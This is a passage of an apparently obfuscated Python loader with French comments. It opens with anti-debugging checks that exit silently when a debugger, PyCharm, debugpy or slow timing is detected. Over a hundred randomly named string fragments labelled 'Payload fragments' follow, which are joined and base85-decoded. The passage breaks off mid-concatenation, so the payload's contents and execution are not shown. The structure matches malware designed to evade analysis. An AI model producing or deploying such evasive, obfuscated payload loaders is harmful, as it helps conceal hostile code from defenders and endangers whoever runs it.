#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_ccAhjN_IqcyUja = 's|DCXWwY)Mv}Ufjo^}^P=bDaNz!opEtp`<ZY1K6b>3;4$&6@Qi<hsaP&n)q;$Th5V>}`1{Xz}pv#'
_ck4J9v5gSCAJhn = '7c@BaE}nQd^~aUmg(+KwRUgs7wNWl%c*yUVl=S_;n2R}{D1l!2i3=yGRv`gwTFD_xhBBhq%Dqp2L'
_cnwIQWKWQR7mIP = 'Be~Ovm`b9&e*H_QZapV@;ctuwJi-uZcwtcIXQu1ZKT4gcgshF#oOS8F*+W`s`Tz597gLJyg*|ly&'
_cvXXJWFQyWRFSZ = 'Cj^4Yu)_sa=SJih_3H$A_~qY$O|6m6M1RP7%EP0thZOxxAX4TL0v<@`>jhOsV(O>@USgM&mDKJ;O'
_crbEpaTDxsZPuM = 'H>!qr)y=LL{uCVbO{iSfv&SwwB1rXyyeHXl-o;gYpyJ1Hb{P=scYIDepXUTHpgAR(N00OWg*aWB3'
_ciL4JIW8N83hC4 = 'NjuFi{ZlA8El9}k4?ppywGhaiU;b}CEXCs(#2MG5K2*HcOS3w7hnGt>$mA;&fUmjYts!l@`hdyp('
_ct_VOsDiJRgFg_ = 'D!RcJp(1Xkb30HBCRDagrQ<6s!ecvHa{Sdl)@m8N@!>)->?LNjh(sHMkeL6jRQ^^fp#E=)2Ll0RB'
_cd6Br8HC1BWztB = 'cPDI3Q%3En4+Kr*XCmk=n&UrYHqo=T5EIH9c5HIfQ?Vni9(#rIbiPp_Gl1_dcz3(%hcM`v;<Htp9'
_chGOj21SXhVbge = '0m@28gK(YVp+5~9t9@3J7Y`2m`j-!NXYV*FK{k;_}nptVWPx?v6Xo0q+-#;2bAAGuw>Hb`RJd!re'
_csrLnE8ClftnBy = 'J?q|JCth8K30_5tE*_@KJ6^$xLazawUfABBWf@#~ELfMfC$z-PWxhMp)V@S8gvv%i|m1(MVyFGxp'
_chEduOiJP6iicW = 'niQljs@-u!)r8fsc&g)-%Ue2{0Uc>b^J%!{9CKH)WH*o;v{?)|wl!kCd2H|n^eRMX7ZkezNpW4+)'
_cuiciHHj7Tl7Oe = '0`PDR^!neWR=EvOS2POY46W(LWnDzCzM<UTr?_zNW?erX_7uiuQdPeFEBz($F0d30>hz+zfl4=62'
_cuKkW5pYQq15r2 = 'YeC^rJe(K#Z;yi+ul3(8e17fmWwO;eL0KG@0s1BjWPm(LYbrVTrCT=_kdj{nH7kJO$m3RFe1czUG'
_cntdHgL8QXDGyq = 'I^YCM<)<NRcnb+%_&*bl0fAB)N5Wr`Og_RmRQT~ivY106UyD&w~3JApUCyJayvyd{BWo0CUMN=(+'
_caUnIwjxuozjI1 = 'yF@|TS=+`0wQOyW0m9cD}On&)2$8k$1d>2%SbsG(YlILq=SHcLTLsQxusgMEO1{51zLAR$6!8#UR'
_ctQJZ2olwnZENh = 'SB&CYtB#vUoQV_s9tAVhmQYP!(DB2qK3!V*w!iL{n9MXCGlpuxa=7@SkQ?qxC?<Gu272PK^Zz51W'
_cm6C3sfswHkUAE = '>oO3d!&g}tNvyi+a%$9YRV7J_efdX!}Y&fskw0#ll=%@erbTi=_q)wU<ew}mZh}`d9<Jg<F9!;DT'
_crMcN9Lpg3iXMW = 'vBWt?9|+pGx#D%*U|qFrm=Ssr7<rdavAGNvkp8jp01({sEN4f&arjI#@^QF)g}d6g!&$Bv;DDq2|'
_cojcP9xhgL6Hq6 = 'f5Q$U3zW~(N8J`A>)1$LL*+Upd3tJ@*4^egYEhgx0F3q+(1@>}@b#z9c6=&BLUyy0GF%=B!@>%yj'
_cqaG7mEcouNJNR = '!X0<1DCUlMBCno|LjQOPBH%fX^j)i!^)hQaQjimPITWWDli&*?fr3Ed%zmNo$Bsn{%xw|Q9@58xc'
_cfMmuTrec7lRGg = 'w1#U%hXXx&I}d|C?Bii$io+t~P^D<>T04uqj)cxx4NuFV9sA5LQw!M2ZI#Uch&G%OZFU1>{;*5oz'
_cvMMW1XRA6rLkQ = '&Ow{yP{}wPA=w?<=zbv4x;<YPRGLYj-GCuo<V%TW4b|7iknXj3O>s{2M0|?tgKT`Gv}A05p0e_X~'
_cxvMz4E1SrNCrQ = 'w>hJQ<Orm<A~$kRc@b&~|TjTH9oJjK%g`dd8GJ0+ppYi`JTOmQ==9!-<Yy3B$*Z^xD{@wLUzgiM?'
_ctnpePsiL8dVh1 = '}-&(>*4gbE=N#o4<KGXB7Kpn716%V6)A&Ts~om%@BtancOyN=2g~A={7~i1O4_G**hODDn)S+<mD'
_c_mcvidEDJsQDf = 'y@6Es0kIm_J!#+-;!_4C0T6}fAA9{@d0URmc*q2t9`TQ;?cvBO7mG%>XVly}7!dpr~RMp#Wb}%3l'
_ceE6uOb1HDNRKa = 'sUITM`7niUi<#^iwf!O`1=%d<YO08$k@c%70T+RB5$nLXK`>t^&eT(T0F}10A9cg8e!sKwR8<cz2'
_cyI3skKLFHdZsB = 'Gi<%e3M}0u@D(CWHXxgtS7Vu1`)T84!<xB)$_7?C`Bu{W0*@Ifr0wN3I+WXFV$Mn|7NJR4`LpT!w'
_cruiPzqbkH3DtA = 'D(YRK%3Lz_TiUzhUbWW2e+pnXjTM5cF1dw&^T0OykVz+g!V3Q5@~eW;;v@Vg&lw^Itj#Ec$DYikR'
_cuJJfCFkPWVHsM = 'C{R(-2+l^SL7ZfqC(a3VoK2-+oTdNtx(xc}R>IbE4!@TDg@NhDC!HG=glbXY75jUC*?%m{#ZEpd!'
_csEkJsVkVy_573 = '*AGvtS<G~>HS`wRk25&I2A#{onK`YfHxU}W-Xo*oUt@!gwOsiPFh$*_erUE@n=e<<)E3Os&E=0J@'
_cv9RNSiwg6puye = '<zdPdV!*gm(d2cw;9n5sn&(E<|Mf50SU@MSAn|P|ChmU&w1fiwTE^_=!tH)R^4vtJg+K8wk+2faq'
_csnP_7D_AIBWwn = ')x_|5YBjc-8NE2T^_6^aTTsE0@@XQ&o($hMsGyV&*+Y<ayH%T6RYK#rDY&s^zo+x+n!Bx%^maO_d'
_cmIiIH2trytZXr = '@P~!Y=dD5!GcJWBR>LTl|1OPML~mX<?W?`->IRkXT_mpzk{P2>Z^-8PbUCC}!2d(}(43pd*X+woj'
_cgDfb17kXkBMl_ = '5zYVhhKT;HSF<Y&){oj`)!M`^EKK5~wDxe{iV0X=dF7*=_vJUw-g3`e0VMH&=%TB;uh$g?H?rLMY'
_capfKgUOjO6K5b = 'KfG=`DsnoPGv6W1i9N%@8+-LX)>=XvNYD^yb$*^ZTl|Zv5&@sQ#V=an^5cMl{g!|$?)VJcGb@$_='
_c_kelISMtsNWgA = 'WmAs|wvgU$lS?P#hl_wxm(cqLl8~JyW}{ISk3RCU%}%{S?}MOZo5JLefuMk~!-xnaZT6y4;ejdjG'
_crvdrDiP8VmVzG = '&=t|qKvs`Rix%jZV4)p8yIA;F=4>;Egbks=bYlmOkI^F5l~Gp^(z!1{3I-Fw}Liq14woZ*4R<m7#'
_cwWG_dAzgpFeZa = 'n(09e+dmY}r%0Ir*aPIar-b^;YmvB=iT`5DWOkbQs6xKN>2QC~OCkiq4Ff33y*_1HFP?*yF@Y<$x'
_cuoSRM6d82fx2W = 'kvFR3irs)`>|+s#y=r^)$B*HaX`_Bp^R&~RkH4m;#*->*XXO`D5uViq!fNIT`?dF;SJ2-Ew#4TBT'
_c_OQHf6pzZNhRT = 'lGsfb*8gjuGsQSbEh6TyzobJoll@$P|(0|ejiwB4GylUWRp{9X=80{WOsN7VeS0w&VeGG<vaW_&x'
_cnvPsEoISpLWCe = '1+*f_jbFV%`wLp8(Ukim_K=nUq+A+t@B;FbQ4=3IlA$lWzoQ%+)p;HP7yInLA+t8!+;}Avqi3@tp'
_cvmSGDBIhwfUsv = 'PP@@1AJIYL5(4n&P;?DD>WWoaeCmfs2#<1N-wllMy}8rZTa?x1Q`H;XQ553Z~Hs6*X^fqLI`4;h1'
_cwlKXSAzXIlQ4D = 'R%6Nq*b1YCBjVIdyIH_bV+fB|s>v;mEFlS%q(vuxDGDR-%2tT$r?D!cZy!Xd>=fKLHZHddxNb#aZ'
_cmhXe_V5gATjDu = '3j&9Y~UWzsw`rpGlE9%aOKA_4i(9%|~=g>bBtsi;JGz63()>h)Djy9SdCt#K!P-hT1^>$OWdqm~x'
_cj2cRiCeXYaXrw = 'r4I`+n2f_Lyg*A2{%|4Q<^`XZ4tTiU(nQnGNrGi3(DK2-DmXUwnWB%;;wpTDX3*B>50%lSw=+kBz'
_cnsPYZBZbDeKra = '=8I_gTN-bh^2H`e7wFy%ZsI1tuISGwj){KjFFkT?|0h?TA+e&nl=OpaLRa;4k1}HVYz%sAjlIw`q'
_cbX5FvwPtJ4CDu = '3Vr6n$iXum%zAT6t)SJ2AF*hF}6(h8JJGX52nGK4?Mi)OD5U|u%`2U^k#nm%FKWG{*<syXwJ`rV$'
_cyV93DbBOXF2AZ = '-1J%D9m_E{Nm|4Qj#H$dgK{7paCSE^5au(iDk~wy%EY<e<`&n^G5oIy0Oc5uK}d4pmihB11&Pi^T'
_clO__0I59JPY8L = 'T+;K$d2uK~U%w%JTF9{tNL(zwxNH=yXL!Y7~dj+@YDA^Y8%DPVzf%96t~4zfJ0;0sx;H!om_ii57'
_crtd7D0g1FCHAr = '_$!iA0KrFSAMfuS-oExRcZT=+lFa+@K5W6#X<Rj*6Rt6Ma6@>+knbe!v{w*&gnEu{FC=l<OZZ`~!'
_cmSyjZbc9ouNEx = '^(tVwgyr>5W^S1Rm3l7Tk=T)py7e~u##o@mfPM@4`EHZdDEYp)P9_IFkH`lP^(R8=SX%-njQiv+@'
_cdorLHqd14KZjv = '@%-X3TLn;PaDhO^m`&nTvOrCW`u&tpQgX2;&T`53cg|x;I^+)0P<)c`%_AYjggK~X@3Awptp`Fe2'
_cnQ7ggOqvTj6fn = 'G-*o~b~>i3~NUTyG4~!0Z_s?jDdNhYSTuwe|2@pA$m&%#RU-IZ=w859&bJVPXD&!f3EJqQ!6mb~3'
_ct5zAVHp98jfh7 = '4<%o&Z5HEUs=-pCM0x^*tw0Hl{?%+4L?L4{avCpZS4hWd(h>Z>Y2y#%Uyd3>bs$sTQ2VN;hmD@G$'
_ceqlKLjycjXgqt = '#0l&l>7NY3W4ywKEkw>hGV=sH|RVQt-tYzZ2ZLKMV?j3T}&fvd{oGFxv_X_kK??+%gU2o|Xm<_4I'
_cqelSirBmhLC2w = 'yoz|*Z(+v!+zb+eK3;oQd$tV`=@RcdA-`+@AXg?zqg<6*z=i0ZUPKYo!<ND$<u-O}%Yx=ow$>+|-'
_crKi5HHQJIBTkE = '>WCA!KOg`UynM_dn?sdu>4FK<;<^2;_R+&!%=a}C~JZ4tf+j?kKKQWfWglOnO{4m^lFEh)Ov1Z5y'
_cnK8chMPP4skhA = 'H9_EGH`NT5D3ejX1Q;r15Rfw4SgAqdzdRFLEghGn<~E<Qda1mS8KD#}2vl8rch2@Yh>0$lQ6(gg_'
_crwXuomR77jGF6 = 'Wz5gTa2vj2PFat!tv<7uruncX8gNQxsI)mzR0qMCeMuSXjg1oLIStjKYEf`ig$tksGfUd60FHO!K'
_cxpoFBnbHwdhIC = 'K&+UauZO**J-_Zq|`AT5rii+-4#yr!4=<Bv{kc!U(*<ACnPr4U-SqF<n>~upiaE<%Oc+zCP>Y?ka'
_cuLyD0ZzZcaLrL = '$jtyfZi&EKO^S)E!oYN<pTka_@FoZo>OZz0xeS=&ukiwAR5eur?)&Va1C7oV2R|YuODT*-3GhgX7'
_ciGrkaIOH4dWt3 = '6%Bf@_jh_;||OwRmQ$V>VBa|ui;E#`uylnh@m0>9y*nTjrlp*?>h8zNVRe9gFQ?G+-`l~HBq}l)o'
_cz_1UwCeHw6bV0 = '}XiltSCrM9wP{7Ey_;iudr59avwUiIL!Im(;FojYea15tR%0`@rny)|#tmgv~`mT~plM6IQ3$w}U'
_cjcnWvshlXAEhV = 'Z(5XDxolJdEXB@iwo_T|FN9&g-{DSfI}{7qs3%N-bJY+CTQTB+3vxn||Wd#h%zqfmrQWohnT0{hf'
_csqaY_D_t8xJ2A = 'dSgw~G<f|BUWl@U9W?}x$)j0sUn#Xh&2D!T+<nl5#E5&&?V3%<pSIP{A*p&`$bfu(@;|d`SsM<&w'
_csd2Gd8XKEgtxG = 'nu>hIPK>q2Prhz^q4t8*KxPF+;KB<5(597Xg+g+q5`4s6MUiXxIyXsSt9{F{W(sit4R?$Y-jc%JA'
_csgnt0H7nkSbqK = '(8z3v58PTOMPk0&LaNsNj9WSTnm~BWZ<Sh^E8Z>L;Ee)F*E>7uax}wr9}(_oexlOUH81$8|cN7D`'
_cc4LB2LASfAsQS = 'lNgx-<r!X&W2}JacuzrG;^<%fXmUUr(B|(O}$Ahxy7O>S2FzoTNtwHw!mn<vGfC!IHq3dQ}icMZo'
_ctXrPDNdH4S9cs = '?;TkvT{1222ypqc+!^dJdZ2M_<oKgPMjnQP-&qD51dx-K&AZvzm(9>}_&KRPP!;SCYFqfl42{LBp'
_ckbL2jqnK0kaJo = '*ucnfmT$ujN*m{7M-<rU60QITNMQ4cMn#*fZP*=kl0I%z!I1XYX$0ht3Iy<Ad$OfRYj0bSW1=Qd$'
_cifKhTkOLlzK9x = '%HnS(uSVSr`#`3Dr6sbt09%jYRJ*~~`DGxDetnn0aF#?|2FeUAvU!==YeK6JX1@kcs`FL`FbA97='
_crkppcx49Ll9cN = 'll@N1rPyk99kw@>g3$y&aA*9u(ESU2bvF&h8NzE;9_x||B`uA`lEJwF4yTk@jK+rz|ynT?se8kj$'
_csmAxMwqn5_CpF = 'n>lYY_9ap{a8oc-?>3`&>hr%0tfAZk9b7o72JA^O;z%;gt&VZh`L4ttb`HT{!vLfeC7mvAQ9w4=J'
_cw1gbhaydmutGA = 'zg?v3@QNI56diSfW1Ju7k6s(XI42i*dn>%^;A<<58t9!7d46p$+3)}K5P4JJQrPpPx#{Cm#;RNCJ'
_cwA0MsNgsLMv4H = '-VVMoMZ|hyIsA@wkQ=hSR4BuxjR>@SZc5y{tOmUT;FIdS{e({=nkt_T1_n@~Ne;%K1b&hU>F5PN|'
_ce5Jb5GuSHw8DK = 'q}u!vD6Pyy`?xDVztFKa15j-A=^_8zc;4cvk#$yXgioKolFYrNQoR#e-r*I+cK5O<0YR)fNEXL7K'
_ckiQj0li_sDQKE = 'S(+|g0_pBo3L{dUv*MD9t^I<!djA~6it+PN+=R5(s^WVaR<sQxSx&DzJ&`t;}TH0LFL$=!oNuV$d'
_cph7Q7OLj8o59t = '|9F={78W_DIkc-kq$*u1`BrB=*RuB!04Bogs4VC~A$nIFhlGMS~xCRd-CL)4xX}RnyKZ7*z`7EOL'
_cahWlu7DegpmFG = '}Hae5H}t28IWh`P^?>K!Hsbx5_4?g8r5%^}z+^|7R05+J4Ng@s=yi|-tz4Wx)T_S_Qc>}m^3JQNu'
_ckt9d0sLtBf0PP = '%k>d@CIw?eY!!beq>9hNPi?!rtL7y&-mmk!BFDf;*6R)Teb=~Qvm){0t$o&B=?xB8<4(YDNb#Se7'
_cm784obpX33zyN = 'ntRZSfRd{~Lf}tXr(((2{6vfo7}r;}D8O>(sM9jbS#73{qZE9fSvhrbst8d*K@@3RVR<6ea-vBs_'
_cwHRfHTyRcy7ea = 'o_ShfoyQ*j})J3Uy1=R(oSH4O4jZ9iw#9S3<oa~+|Z!ZSdBACPF+P^mbu)mxHRm%CZ@2A7MQ^i8C'
_czdb3D3K9JGisJ = '&%-6JAlH)&MZAJ@}<nlbHTU^H+E;=Py@@miB}sTUWoyJw5dc7hY43+kNw(RnN@9=R@HijFey#E{&'
_cm4jP4Aec1WTi4 = '3xA_i6*^cK`Vp}zVSz;7iiiV{G~*1Y%X?YdN&cxE(6Ss--Rmq`hg&kT013{tss^b@1Sj6I&=OXj1'
_cuECcQaiSWyzmu = '?dT0Mg0h@E^6HCsNvO<8C)u{0%ST4;RzZ!p|uN!w7He69!FHGgd>K)GTFg^57!8<wh`u!_SW6{k^'
_cf_RXiZskkaQsD = '`fn^-&?CtYxrd`$`EtDs60Wq%g3IHia|oV48?UL@FsLbcMX(1#MAd8>vQb5X-g#-u^=^I1Vd^_LX'
_ccbnMhZL6_CZGw = '(EIfJUHPP|M7fs5U2ABr4@3e%M|mxkbBM`v&=?Uq+~ir_~}T2Bh&4AXNg}xal+L531k5Vf|nC;L%'
_cag3VVSCSPfaPu = 'k~tarqIfeB};TSM7Bchdp6(1C(NTYQr_mOPNPV3JDOw@WvF*rm+SnBxJ=A3dzcttDc8BTYf3(@v2'
_cacP18QnuxrYPi = 'Jx0258Bw&}fs=p;tje!|7pIu66`Wd}j)Up6&3XQEL;1)b%Ny-nSkei7;OM2;52W}dqF^Y{mKo)*e'
_cw9rjERQSr4op0 = 'x#?Mr~45QD+*HpC^_l&cok2{)IPBQqFMhnP#4H3XNJ^V!}i|s=oj<GmtB}BPO)}?m-mZ4_Vb3HKi'
_ckJhQS6F3N7Mhu = 'Or--fka3h0FW^*#aQ_ww6|1ZO?l?sV+}U@lD3FERTGWkgoSvafW|JaY2NG)ajY9MIS=uG{hh(3EK'
_cvVWCKviHPZO05 = 'z=3ASpTrl*?)^F&fK*MrmXB<I{DJ77Z?@<ML}X`Ec}x`V$1X-qHxM5mk@w7M%NeKWx8WFDi{<y6v'
_czgbBAK7tk7q5k = '>ws9&@{fS^K)*OUmUnjBVpxylOTpmQF3d#3(k2j?;eLgrm~_8OpUaB|f4p=y!+E#3@ojnK`B+1PX'
_cdUb8gD5zc4c1U = '1h{8CuvSAC@?{jcO6C`)A)=~c=y@7J4&pSQ<{BIr~p=p`pz@m3@)xn}@mxv&U5s!#t@G};n3nGJJ'
_cvxFn7rT55wbdO = '7EhhU>B|d6vfEd@3qO1S~YRfX0I?b<P1RXrwfYFW3JyKQbTtY8#Fq_z^ijn2u(6+-bP`)9hM37+p'
_cdTUcCkRfoc0Qf = '4-!~3c_z-*hg*)=tD7Ge;jU>HP7sHQnPI0_!{jn}=gg8@sCz{sCD8Hwr{Semtfd4}@qBO@8EXLSh'
_clo0XOmPEQJSt8 = 'UUJ%IIG4C*4IVLWz{^loN;+ICAjvzah{v>%we1sNZu&}WjST{6a{{y=TD&cjg)dCDQ=v}83ZeF0a'
_caL4wtg_6kgfyp = '#4F&S}^Gz`xBaEhd$JT{wdSdusDF(^VpZtHF;}Yhz^;!e|daq1>9EWn)TGak({k$T3=_h1IM55!1'
_cp2PRYdr7ugK9P = 'EakXr<Ilh>9YQS8&~0N*gfnz9s63i}k{=#noW*D^YV*UgSSTU#nyVC?b!VxG?;^)z~nJr}`^7$1E'
_clc1wikW4xdPkA = 'yd>q}d9qCP(yvD5?+k;UXz}Xkwg1Xj=+YWPEWo6vVRS3|<|Fa8@ak~qBe-rzdWi@mGqb!)IwuTf#'
_cwVuXIGVXOa3nh = 'v99cq`4&ufIJFDcB-C{TMv_}3)ha6viq91C5vA|KqS>6YaV3|PfgG>wgoX`Q><wr9Yr4GbZ{Y$%2'
_clsw76obJIoeAa = 'xHe|>FWE=Nttz+pnqJFRvYwyh}*ngb5{KWbA+lyqKJzF3f}rUz<AC=7P(BvwTA&Et{I10v!a@-d='
_cduMdU_iraju_Z = 'AHxt4xxRJ$*+ym-)li0wUTy4?Utf*?}yt)L7GPE1ZW2usB?$vD0`(ZEJb75GWCZ{Egwq?ek7Y^)%'
_ctnQa2Bv3Vm8TD = 'QrNoK3+LlFv0Azfm&e!(0!JVwH#b~B;W_7Rt3QOIo#f%%m4N{U^4jl&|+K(?NP#%N#RDu$%V8aOh'
_cqlLXD7btcAmfr = 'e0r+e;T6=q|IPs;W;ZS65aueL}9URLej8!T#E{oO&SM5IZ$X@s0bV;k4NS#)au8k%)oL?pEy%@^H'
_crz9GZeU02XrkM = 'SuwDgYIR)ugBG3fVVamu^nrfWqZ)2W&+z3!k10D20~JzHHySsq^Va}2e<Cg1*xryTtLp?|c})8I<'
_ckDVrAMhocytbw = 'YBqD->$xOeT~_*=S2iq01aJ-kom}}k^Ex6yv?eGM*72sj6;V&=oRnn^ISb0fxKc+3n1T>>77weJO'
_cqDrpY_ZMrP7s2 = 'ZrkwKCjN*VC*8YdbRO35p_qBuP%{-c8o{@l<m%HOv+0b1vgcho6t<_(F;v!z?Y^G+U2I_pDZnR1y'
_cnoWr1D2iAq4fl = '{10pThaaf4fCimxhE15Yd_K;Ltl!g`s_umHrqry(lglZ2#;L`ho4R<aAOQ^goGJ>*3;y;D+2MF7z'
_cux57nPDgP9yuX = '%SA|XiPI9j^#f*osF$lJZ79m*LR;je_|Lub&PI}T+^)oNW#C{BJnu!@()m^2_ZBPe!J2^JGg_D$a'
_cc2WuJI2eyVn1p = 'wle$x%n9h+roJ*>BwwORX;6-N3ii|^CMk0tU9b*3^)`))g<{GNj?o|`>_s~%vcSTQWnAO|G`Q`UA'
_cmLBuS0HqDwBux = 'KM;jeU{m5@Us#bmxA>!`PAL_*(R6XoS|F-utzmB@hQNHMXts)`{D7PwA6*v7U#Bcfn)-C>xCaJLc'
_cyLAsjTLaicv86 = '3MU_T`oNA3(ROV3&1C%s01<*&Wufm>7iU7M}ZB44p}a*<u^{VkU>HE*kGzUNvD);bi*bn4iZJFA+'
_cbmvUOvkI5FtsO = '?3Vm5G)IGm4{GRh$=Rp^riG&@jL+UiSSQL+Ex>0~=p>fx-cV=vle-ilX3)hrSWIamFwy_OiXe6+x'
_ccMYddvNdGn6cB = 'A8p&|RmIbh2mP5_w*1;dJ>%yHO1?N7hb3})Jv!bP&sHZ?_Gw6ZOT_=7ys4z8lCKchCvUF<G@T)>B'
_cw7JkFvVHkkihy = 'n}vw7b(=`SsJkD|;t)S#ym_RF`IAvvl9%~xSGBy5EvS}&O=jCCm<264N)1KdzqVEzW`*Oh&pzjv!'
_cpOCrX5dwsDeDq = 'U>6pRCjI6PWgcOE}?L2R!~?ZGN2tp9N6)SZ7<<|;5>x9$SGf97n)J5@|<HWZLvrjocl?TeWtc6y<'
_cr6o5RIBTrX043 = 'W$}Zf=MTifGJ1k6h?&<eTh>$;41l@d-Qh9J-e}KI8(fi79$B42K?-k=_VhIRtkC!k1b1tM*7dpk5'
_cn3QzQkIdCn8aG = '37m2aimyMAoZaPyHB#-B0k3adgG3cU)ikw?ePx;8BK`g|J{wU^+D3Pu^l2OEQ_SqVDWG`wvBhLkn'
_cigX1xLcS3XxUH = 'WZ!cKQ@_Zmjd2OSILaxfr1N1b^FpQfu<egeA1Kycsp_|2JVhQa3x#9*lKBVAf90?r4lqmynN-pp('
_clBI1STOeCZSOk = 'ygUbpLb}kaN+sY;<N>6?1ej~~xlGM5mk&J6(7)eUG%iXeCc*jFLL&W^fm!Y>fL%~o6L%mbgrU%6I'
_cbFsDBQOzexiJI = '0O(8<IRl9(#WL3U#z{EZxk^6XW@XEf;}2;-+6p^>zvSI0KIGMoHW3<`M?+jcM74D%2?ENm~o@rrJ'
_cyo8Xm9Gm8MtDq = 'HnOna(rcfLWjJKKy+o9|lQMkAr(ZcZt2RiZZBd2zJ2PQ$QVhjzvox4Dbh{t*c5Uk}~)jl_J)AcH4'
_crCCarzaKoHHrV = 'Q*KUuSC`VlsDc}h~2PIV`%WZN{toeZhlD^`=1McIgN_ohlPZ3(PL4gNN&o9;%?X-aFnVAmDPxt>j'
_cttd3otHkiAJ2A = 'OJd*HO^CvuKiL*{)LV%MivFs7DvtU|t=jD%vhn%@3#H|}$zF0Gh&tuN)c8ToI-li}Z8ZeBu7*cYU'
_cyOkxNYwWcF9wF = '?g7WX%^E>Wg{zY7!?<&2TwjSVSXrB5BBPZfI`^4O!bUKiYgDOm&Ly^eICDLR32&r{-xV*x0J9&$D'
_cd699UkCCAz7hF = '-Yo>-vOdfjor{Z9wBVKCPh-p70(ohu%5PSLqL)-u}}~C&&4dn0nDocLO_Ct12ZQ&Ny^CEyOhNl=8'
_cc3gDMWQyHbhsS = 'EH!T2h^D`o}pD!5dsv5!<$N8M^_vr0e0HuiRVDIjePCM020jck~B2pR}-?2{`}x$9-FR)Ez*1g<)'
_clHLLeU0nBoIXW = 'X^{go39bZ#4_vvjvL8e@5s6_91@!m1uhS%oCWtG>^NNV@-3+i+{`oiFfp<0PK+%ryzvWaP;qh@cc'
_coy4VGDbgMXDbT = '-I5|Z6y>0M0uPey4PtRK(r$KO4(mjm902p1kySx9N-&fMNoe8T}5>+3!ai8^Q|D!^r|1lLOoYKg-'
_ci77VbeulrOrOs = 'AB|hMcNm**2H%$NnkpE_B`GmwBmr*7N7;^hLGv~Lv7!xNv5wrUx5~#(RvH!coVQpXSupf-nDS<GO'
_couMV_PayWg7Zv = ';hiMMg|`PSNZ6nfN-nAWKEPmd`(s~HsFK}DeU36oQDB7_w1#Blfz(G%SdRF^Fj<Z?tDD#qbr3gb*'
_cctQyS1HBgQPUj = 'NR>45oxz9&cvGf?WXGy!FLI8orqiS}N5wf%7F}RLdzf5_V<b7nFdjp{3q~ZYw;yl1)DPXZY~Am94'
_cjaHKqH3rWQRLf = 'bD;t7Lt4rmkiq2zorOb@ee7&^;BWNsAXP~`Sqc*6sM)zOrevYnGrFcTkhcfj@PS>z#B=I2h;rje1'
_ceNZdXzZvpR5SS = 'Z@SLQQS{A_tX^fK>uzp|brjCCspj&v8W%EX{<`vy!@#@P|6xkJ7`=S~KoF%s6Zb|3}gP#9T5Ko-#'
_ckdUiKH3V66nJ_ = 'D1cZAaskBoRv6tE4ApNQSFzmN7q3%wY?XHVg#S}=-Dk^tpXB^()+8=9Eac^056yV??0MGO04jCFz'
_cyk_ZDkV2KnreL = '_I~6jx=hlTcN<jFWXh)rZth0JgOE_aLFh^mwCF<<Qh?LpMr(Kz>2%wvm!K_-tDg*q?d6L(nNY~ln'
_cckwHClMAqS251 = 'Z%+767d;PUe&r)Ji-#vWcm1qO;A<+}ZI^u=>z68^LwZs+2ePk-vkJ60)Eww|Bd5w<5cgW}`|IS=='
_cleOLyaeV0C_xh = 't(m8})yxjm%S4RW0kp$b;+b$MizyGuG*3@+vRHZ5vr{PUs0r)cEz`(+~K3mr5q)*T|m0QuS^exLy'
_cdGZkUQ2jMDmUy = '$FlqD!$*a=%OY!ZpBw(z0lq%ljkQJA@lrucqQ^^M#LvtJdSniwryJiGhhpG5*`!-4)-;nq>@zYEl'
_czk1qMPEoETw8n = 'AVrU~U!eqgTL9cY@Sja>-!J=*?<d>2c91Wh_>&LxvbUhUscMn+3zH<^9VY`|R>IA4h#MdHYn*gz8'
_chpSJFcyLeuhct = '6#L^x$Y!|&2Kx__5(ArqVk9H`~P{HZ2CjAJy@-{PbO`zezg#M9xE+MW^6C8>A-Eg9TKzjxJ;*ag6'
_coH3bLAXRRbqCX = 'pTPJ5HUwK1kBJ6Ozvj{BKTN!+fL'

_puW3z82EVcJw5F = __import__('base64').b85decode(_ccAhjN_IqcyUja + _ck4J9v5gSCAJhn + _cnwIQWKWQR7mIP + _cvXXJWFQyWRFSZ + _crbEpaTDxsZPuM + _ciL4JIW8N83hC4 + _ct_VOsDiJRgFg_ + _cd6Br8HC1BWztB + _chGOj21SXhVbge + _csrLnE8ClftnBy + _chEduOiJP6iicW + _cuiciHHj7Tl7Oe + _cuKkW5pYQq15r2 + _cntdHgL8QXDGyq + _caUnIwjxuozjI1 + _ctQJZ2olwnZENh + _cm6C3sfswHkUAE + _crMcN9Lpg3iXMW + _cojcP9xhgL6Hq6 + _cqaG7mEcouNJNR + _cfMmuTrec7lRGg + _cvMMW1XRA6rLkQ + _cxvMz4E1SrNCrQ + _ctnpePsiL8dVh1 + _c_mcvidEDJsQDf + _ceE6uOb1HDNRKa + _cyI3skKLFHdZsB + _cruiPzqbkH3DtA + _cuJJfCFkPWVHsM + _csEkJsVkVy_573 + _cv9RNSiwg6puye + _csnP_7D_AIBWwn + _cmIiIH2trytZXr + _cgDfb17kXkBMl_ + _capfKgUOjO6K5b + _c_kelISMtsNWgA + _crvdrDiP8VmVzG + _cwWG_dAzgpFeZa + _cuoSRM6d82fx2W + _c_OQHf6pzZNhRT + _cnvPsEoISpLWCe + _cvmSGDBIhwfUsv + _cwlKXSAzXIlQ4D + _cmhXe_V5gATjDu + _cj2cRiCeXYaXrw + _cnsPYZBZbDeKra + _cbX5FvwPtJ4CDu + _cyV93DbBOXF2AZ + _clO__0I59JPY8L + _crtd7D0g1FCHAr + _cmSyjZbc9ouNEx + _cdorLHqd14KZjv + _cnQ7ggOqvTj6fn + _ct5zAVHp98jfh7 + _ceqlKLjycjXgqt + _cqelSirBmhLC2w + _crKi5HHQJIBTkE + _cnK8chMPP4skhA + _crwXuomR77jGF6 + 